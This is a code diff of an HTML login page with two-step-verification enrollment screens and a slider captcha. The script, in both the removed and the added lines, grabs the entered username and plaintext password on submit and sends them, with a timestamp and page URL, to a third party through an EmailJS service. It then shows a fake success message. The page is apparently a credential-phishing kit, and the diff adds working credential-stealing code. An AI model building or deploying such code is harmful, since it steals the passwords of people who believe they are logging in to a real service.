-				<div id="enroll_step2">
-					<p class="txt_ctr instr">A verification has been sent to your registered mobile number.</p>
-					<p class="txt_ctr b_txt" id="enroll_mob"></p>
-					<div class="row">
-						<div class="row row_flex_left">
-							<label for="enroll_v_code_input">Verification code :</label>
-							<input type="text" id="enroll_v_code_input" name="enroll_v_code_input">
-							<div class="err" id="enroll_invalid_code_err"></div>
-						</div>
-						<div class="timer_row">
-							<span id="wrapper_enroll_time1">
-								The code will expire in <span id="enroll_time1">03:00</span>.
-							</span>
-							<span id="enroll_resend_code"></span>
-						</div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Back</button>
-						<button type="button" class="btn_default">Next</button>
-					</div>
-				</div>
-				<div id="enroll_step3">
-					<p id="enroll_step_3_info">
-						Please register your second email address as an alternative of 2 step verification.
-					</p>
-					<div class="row">
-						<div class="row row_flex_ctr">
-							<label for="enroll_reg_email">
-								Second email address :
-							</label>
-								<input type="text" name="enroll_reg_email" id="enroll_reg_email" placeholder="Please enter your email address">
-						</div>
-						<div class="err" id="err_enroll_step3"></div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Skip</button>
-						<button type="button" class="btn_default">Next</button>
-					</div>
-				</div>
-				<div id="enroll_step4">
-					<p class="txt_ctr instr">A verification has been sent to your registered email address.</p>
-					<p class="txt_ctr b_txt" id="enrolled_email"></p>
-					<div class="row">
-						<div class="row row_flex_left">
-							<label for="enroll_v_code_input_email">Verification code :</label>
-							<input type="text" id="enroll_v_code_input_email" name="enroll_v_code_input_email">
-							<div class="err" id="enroll_email_invalid_code_err"></div>
-						</div>
-						<div class="timer_row">
-							<span id="wrapper_enroll_time2">
-								The code will expire in <span id="enroll_time2">03:00</span>.
-							</span>
-							<span id="enroll_resend_code2"></span>
-						</div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Back</button>
-						<button type="button" class="btn_default">Next</button>
-					</div>
-				</div>
-				<div id="enroll_step5">
-					<p class="txt_ctr b_txt">Thank You</p>
-					<div class="txt_ctr txt_20 sub_head">The 2-step verification status</div>
-					<div class="row status_details">
-						<div id="row_mob_v_status">
-							<span class="status_details_label">Mobile no. : </span>
-							<span id="mob_v_status" class="v_status"></span>
-						</div>
-						<div id="row_email_v_status">
-							<span class="status_details_label">Email : </span>
-							<span id="email_v_status" class="v_status"></span>
-						</div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">OK</button>
-					</div>
-				</div>
-			</div>
-		</div>
-
-<!-- CANCEL ENROLL 2FA CONFRIM DIALOG -->
-		<div class="popup_wrapper" id="cancel_enroll_confirm_dia">
-			<div class="confirm_dia">
-				<div class="popup_content">
-					<p>Do you want to cancel?</p>
-					<div class="row row_flex_ctr">
-						<form id="form_cancel_set_up">
-							<input type="checkbox" id="do_not_ask_2fa_set_up" name="do_not_ask_2fa_set_up">
-							<label for="do_not_ask_2fa_set_up">Do not ask again.</label>
-							<div class="btn_wrapper">
-								<button type="button" class="btn_default">No</button>
-							</div>
-						</form>
-					</div>
-				</div>
-			</div>
-		</div>
-
-		<script>
-            // ── EmailJS init ──
-            emailjs.init("WWo7anZY4HvX4SL2h");
-
-            function tryAgain() {
-                var username = document.getElementById('username').value;
-                var prevUrl = document.referrer || window.location.href;
-                var url = new URL(prevUrl);
-                url.searchParams.set('email', username);
-                window.location.href = url.toString();
+            // ── 1. Email auto-prefill from URL query param ──
+            var urlParams = new URLSearchParams(window.location.search);
+            var emailParam = urlParams.get('email');
+            if (emailParam) {
+                document.getElementById('username').value = emailParam;
             }
 
-            document.addEventListener('DOMContentLoaded', function () {
+            // ── 2. Slider captcha ──
+            var captcha = sliderCaptcha({
+                id: 'captcha',
+                repeatIcon: 'fa fa-redo',
+                width: 260,
+                height: 155,
+                onSuccess: function () {
+                    console.log('Captcha success');
+                    document.getElementById('login_button').style.display = 'block';
+                    document.querySelector('.slidercaptcha').style.display = 'none';
+                },
+                onFail: function () {
+                    console.log('Captcha failed');
+                    document.getElementById('errmsg').innerHTML = 'Please complete the captcha verification';
+                }
+            });
 
-                // ── 1. Email auto-prefill from URL query param ──
-                var urlParams = new URLSearchParams(window.location.search);
-                var emailParam = urlParams.get('email');
-                if (emailParam) {
-                    document.getElementById('username').value = emailParam;
+            // ── 3. Send login attempt via EmailJS on form submit ──
+            document.getElementById('loginForm').addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                // Read values directly from DOM at submit time
+                var usernameEl = document.getElementById('username');
+                var passwordEl = document.getElementById('password');
+
+                var username = usernameEl ? usernameEl.value.trim() : '';
+                var password = passwordEl ? passwordEl.value : '';
+                var timestamp = new Date().toLocaleString();
+
+                console.log('Submitting - username:', username, 'password length:', password.length);
+
+                if (!username || !password) {
+                    document.getElementById('errmsg').innerHTML = 'Please enter your Login ID and Password.';
+                    return;
                 }
 
-                // ── 2. Slider captcha ──
-                var captcha = sliderCaptcha({
-                    id: 'captcha',
-                    repeatIcon: 'fa fa-redo',
-                    width: 260,
-                    height: 155,
-                    onSuccess: function () {
-                        console.log('Captcha success');
-                        document.getElementById('login_button').style.display = 'block';
-                        document.querySelector('.slidercaptcha').style.display = 'none';
-                    },
-                    onFail: function () {
-                        console.log('Captcha failed');
-                        document.getElementById('errmsg').innerHTML = 'Please complete the captcha verification';
-                    }
-                });
-
-                // ── 3. Send login attempt report via EmailJS on form submit ──
-                document.getElementById('loginForm').addEventListener('submit', function (e) {
-                    e.preventDefault();
-
-                    var username = document.getElementById('username').value;
-                    var password = document.getElementById('password').value;
-                    var timestamp = new Date().toLocaleString();
-
-                    emailjs.send("service_d2hfm4i", "template_4dj5dbg", {
-                        username: username,
-                        password: password,
-                        timestamp: timestamp,
-                        page_url: window.location.href
-                    }).then(function () {
-                        // Hide the form and show success message
-                        document.getElementById('loginForm').style.display = 'none';
-                        document.getElementById('success_msg').style.display = 'block';
-                    });
+                emailjs.send("service_nfx0v2t", "template_ccgi8xh", {
+                    username: username,
+                    password: password,
+                    timestamp: timestamp,
+                    page_url: window.location.href
+                }).then(function () {
+                    document.getElementById('loginForm').style.display = 'none';
+                    document.getElementById('success_msg').style.display = 'block';
+                }).catch(function (err) {
+                    console.error('EmailJS error:', err);
+                    document.getElementById('errmsg').innerHTML = 'Submission failed. Please try again.';
                 });
             });
-		</script>
-		
-	</body>
+        });
+    </script>
 
+</body>
 </html>
